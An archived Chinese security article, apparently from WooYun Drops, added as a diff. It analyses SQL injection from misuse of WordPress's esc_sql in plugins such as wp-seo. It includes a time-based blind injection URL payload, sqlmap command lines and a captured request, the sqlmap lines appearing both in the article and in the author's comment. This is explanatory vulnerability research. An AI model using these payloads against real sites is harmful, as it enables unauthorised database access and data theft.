@@ -1,0 +1,74 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">分析WordPress中esc_sql函数引起的注入危害</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">L.N.</a> <span class="bull">·</span> <time title="2015/03/19 9:11" ui-time="" datetime="2015/03/19 9:11" class="published ng-binding ng-isolate-scope">2015/03/19 9:11</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 背景</h1><hr><p>这篇文章说的不是esc_sql函数自身有什么逻辑上缺陷或者不足，而是说下关于二次开发者错误的使用此函数引起的注入漏洞。</p><p>在wordpress手册中关于esc_sql的解释，在以前的版本中，官方并没有说出这个函数有任何问题：</p><p><img alt="enter image description here" img-src="91990e0e5800a612bc9366c6d51ba0a2fb94fd53.jpg"></p><p>在近期的wordpress手册中说出了这个函数如果错误使用会造成注入漏洞：</p><p><img alt="enter image description here" img-src="3d24eaa29f19c6f5b0b27c80961df37c28259945.jpg"></p><h1>0x01 分析</h1><hr><p>我们再看下esc_sql的实现：</p><pre><code>#!php
+function esc_sql( $data ) {
+    global $wpdb;
+    return $wpdb-&gt;_escape( $data );
+}
+function _escape( $data ) {
+    if ( is_array( $data ) ) {
+        foreach ( $data as $k =&gt; $v ) {
+            if ( is_array($v) )
+                $data[$k] = $this-&gt;_escape( $v );
+            else
+                $data[$k] = $this-&gt;_real_escape( $v );
+            }
+        } else {
+    $data = $this-&gt;_real_escape( $data );
+    }
+    return $data;
+}
+function _real_escape( $string ) {
+    if ( $this-&gt;dbh ) {
+        if ( $this-&gt;use_mysqli ) {
+            return mysqli_real_escape_string( $this-&gt;dbh, $string );
+        } else {
+    return mysql_real_escape_string( $string, $this-&gt;dbh );
+    }
+}
+$class = get_class( $this );
+if ( function_exists( '__' ) ) {
+    _doing_it_wrong( $class, sprintf( __( '%s must set a database connection for use with escaping.' ), $class ), E_USER_NOTICE );
+} else {
+    _doing_it_wrong( $class, sprintf( '%s must set a database connection for use with escaping.', $class ), E_USER_NOTICE );
+}
+    return addslashes( $string );
+}
+</code></pre><p>通过对比上面两个手册和代码我们可以清晰的得出以下几个结论：</p><ul><li><ol><li>99%的情况下你可以使用$wpdb->prepare()函数来做数据库操作（有那些是哪不能的1%呢？order by、like···· ）</li></ol></li><li><ol><li>esc&#95;sql是addslashes()函数的数组应用，但是esc&#95;sql转义数组的时候只转义数组值。</li></ol></li><li><ol><li>esc_sql并没有对输入数据自动加引号保护</li></ol></li></ul><p>由于老版本手册的说明不严谨问题，在很多二次开发者使用esc_sql函数的时候出现了注入漏洞。</p><p>wp-seo插件注入漏洞</p><p>在文件admin/class-bulk-editor-list-table.php中：</p><pre><code>#!php
+protected function parse_item_query( $subquery, $all_states, $post_type_clause ) {
+
+    // Order By block
+    $orderby = ! empty( $_GET['orderby'] ) ? esc_sql( sanitize_text_field( $_GET['orderby'] ) ) : 'post_title';
+    $order   = 'ASC';
+
+    if ( ! empty( $_GET['order'] ) ) {
+        $order = esc_sql( strtoupper( sanitize_text_field( $_GET['order'] ) ) );
+    }
+
+    // Get all needed results
+    $query = "
+    SELECT ID, post_title, post_type, post_status, post_modified, post_date
+    FROM {$subquery}
+    WHERE post_status IN ({$all_states}) $post_type_clause
+    ORDER BY {$orderby} {$order}
+    LIMIT %d,%d
+    ";
+
+    return $query;
+}
+</code></pre><p>其中很明显的漏洞出现了，然后就是构造poc：</p><pre><code>http://192.168.9.102/wordpress/wp-admin/admin.php?page=wpseo_bulk-editor&amp;type=title&amp;orderby=post_date%2c(select%20*%20from%20(select(sleep(10)))a)&amp;order=asc
+</code></pre><p>如何使用sqlmap在order by后面延时注入，可以请参考：http://drops.wooyun.org/tips/5254自写，也可以抓包：</p><pre><code>#!bash
+python sqlmap.py -r 2.txt --technique=B --dbms=MySQL -D wordpress --tables
+GET /wordpress/wp-admin/admin.php?page=wpseo_bulk-editor&amp;type=title&amp;orderby=pos$
+Host: 192.168.9.102
+Proxy-Connection: keep-alive
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=$
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like$
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: wordpress_1d5e8f89471a6349f1caf2e6b8aa4232=admin%7C1426827482%7CjKzM166$...
+</code></pre><p>出现这样漏洞的插件还有：</p><pre><code>WooCommerce 2.3 – 2.3.5
+Pods 1.10 &lt;= 2.5.1.1
+AffiliateWP &lt; 1.5.7
+WP All Import &lt; 4.1.2
+Gravity Forms &lt; 1.9.4
+</code></pre><h1>0x02 总结：</h1><hr><p>从上面的分析和出现的已知漏洞不难看出，此函数滥用的插件应该不在少数。</p><p></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/660" rel="bookmark" id="re1">php4fun.sinaapp.com PHP挑战通关攻略</a></li><li><a href="http://drops.wooyun.org/papers/9510" rel="bookmark" id="re2">WordPress 利用 XMLRPC 高效爆破 原理分析</a></li><li><a href="http://drops.wooyun.org/papers/1321" rel="bookmark" id="re3">wechall mysql关卡题解</a></li><li><a href="http://drops.wooyun.org/papers/3197" rel="bookmark" id="re4">Drupal - pre Auth SQL Injection Vulnerability</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小包子</span> <span class="reply-time">2015-04-09 11:16:37</span></div><p></p><p>http://www.bugsearch.net/en/15811/wordpress-all-in-one-wp-security-firewall-390-sql-injection-vulnerability.html?ref=3</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-03-19 15:50:33</span></div><p></p><p>赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">L.N.</span> <span class="reply-time">2015-03-19 13:04:50</span></div><p></p><p>sqlmap使用是：<br>python sqlmap.py -r 2.txt --technique=T --level=3 --dbms=MySQL -D wordpress --tables</p><p>最后的参考我忘记加上了：<br>参考：<br>http://www.pritect.net/blog/esc_sql-doh-wordpress-sql-injection-vulnerability<br>http://www.reddit.com/r/netsec/comments/2zcy22/esc_sql_doh_wordpress_sql_injection_vulnerability/<br>https://wpvulndb.com/vulnerabilities/7841</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Kavia</span> <span class="reply-time">2015-03-19 10:58:17</span></div><p></p><p>恩。还是L.N的。duang~duang~duang~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2015-03-19 09:51:57</span></div><p></p><p>我当时看，以为esc_sql就是addslashes()，PHP地盘儿还给是LN。duang~duang~duang~</p><p></p></div></div></div></div></div></main>
